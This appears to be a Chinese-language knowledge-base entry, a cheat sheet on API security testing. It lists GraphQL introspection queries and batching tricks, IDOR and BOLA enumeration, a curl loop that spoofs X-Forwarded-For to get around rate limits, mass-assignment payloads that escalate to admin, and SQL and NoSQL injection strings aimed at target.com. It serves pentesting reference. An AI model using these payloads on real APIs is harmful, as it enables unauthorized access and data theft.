knowledge: "# API安全详细分类\n\n## 1. GraphQL安全\n\n### 端点发现\n\n```\n/graphql\n/api/graphql\n/graphql/api\n/query\n/graphql.php\n\
  ```\n\n### 内省查询\n\n```graphql\nquery IntrospectionQuery {\n  __schema {\n    types {\n      name\n      kind\n      description\n\
  \      fields {\n        name\n        type {\n          name\n        }\n        args {\n          name\n          type\
  \ {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n### 绕过内省\n\n```graphql\nquery { __schema {\
  \ types { name } } }\n{\"query\":\"{__schema{types{name}}\"}\n```\n\n### 批量查询绕过速率限制\n\n```graphql\nquery {\n  user1: user(id:\
  \ 1) { name }\n  user2: user(id: 2) { name }\n  user3: user(id: 3) { name }\n}\n```\n\n### 工具\n\n```bash\ngqlscan -u http://target.com/graphql\n\
  inql -t http://target.com/graphql\ngraphql-cop -t http://target.com/graphql\n```\n\n---\n\n## 2. REST API安全\n\n### 端点发现\n\
  \n```\n/api/v1/users\n/api/v2/products\n/api/docs\n/swagger.json\n/openapi.json\n```\n\n### 未授权访问\n\n```\ncurl http://target.com/api/v1/users\n\
  curl -H \"X-API-Key: key\" http://target.com/api/users\n```\n\n### HTTP方法测试\n\n```\nOPTIONS /api/users\nPUT /api/users/1\n\
  DELETE /api/users/1\nPATCH /api/users/1\n```\n\n---\n\n## 3. IDOR漏洞\n\n### 水平越权\n\n```\n/api/users/1 -> /api/users/2\nGET\
  \ /api/profile?user_id=1 -> user_id=2\n```\n\n### 垂直越权\n\n```\n普通用户 -> 管理员操作\n```\n\n### 批量IDOR\n\n```\n/api/users/batch?ids=1,2,3,4,5\n\
  ```\n\n### 绕过\n\n- 数字变体: `/api/users/001`\n- 编码: `/api/users/%31`\n- JSON: `{\"id\": 1, \"id\": 2}`\n\n---\n\n## 4. 速率限制绕过\n\
  \n### IP轮换\n\n```bash\nfor i in $(seq 1 100); do\n  curl -H \"X-Forwarded-For: 1.2.3.$i\" http://target.com/api/test\ndone\n\
  ```\n\n### Header污染\n\n```\nX-Forwarded-For: 1.1.1.1\nX-Real-IP: 1.1.1.1\nX-Originating-IP: 1.1.1.1\nClient-IP: 1.1.1.1\n\
  ```\n\n### 代理池\n\n### 用户代理轮换\n\n---\n\n## 5. 批量赋值 (Mass Assignment)\n\n### 探测\n\n```json\nPOST /api/users\n{\"name\": \"\
  test\", \"email\": \"test@test.com\"}\n\n响应:\n{\"id\": 1, \"name\": \"test\", \"email\": \"test@test.com\", \"role\": \"\
  user\", \"isAdmin\": false}\n```\n\n### 利用\n\n```json\nPOST /api/users\n{\"name\": \"test\", \"role\": \"admin\", \"isAdmin\"\
  : true}\n\nPUT /api/users/1\n{\"role\": \"admin\"}\n```\n\n---\n\n## 6. BOLA (Broken Object Level Authorization)\n\n###\
  \ 对象枚举\n\n```\n/api/users/1\n/api/users/2\n/api/users/3\n```\n\n### 参数污染\n\n```\n/api/users?id=1&id=2\n/api/users[0]=1&users[1]=2\n\
  ```\n\n---\n\n## 7. API注入\n\n### SQL注入\n\n```\n/api/users?name=admin'--\n/api/users?id=1 UNION SELECT--\n```\n\n### NoSQL注入\n\
  \n```\n/api/users?name[$ne]=admin\n/api/users?name[$regex]=^admin\n```\n\n### JSON注入\n\n```\n{\"name\": \"admin\", \"role\"\
  : \"admin\"}\n```\n\n---\n\n## 8. 工具\n\n```bash\n# RESTler\nrestler.py http://target.com/api\n\n# Postman\n# 导入API规范进行测试\n\
  \n# Kiter\nkiter -u http://target.com/api\n```\n"
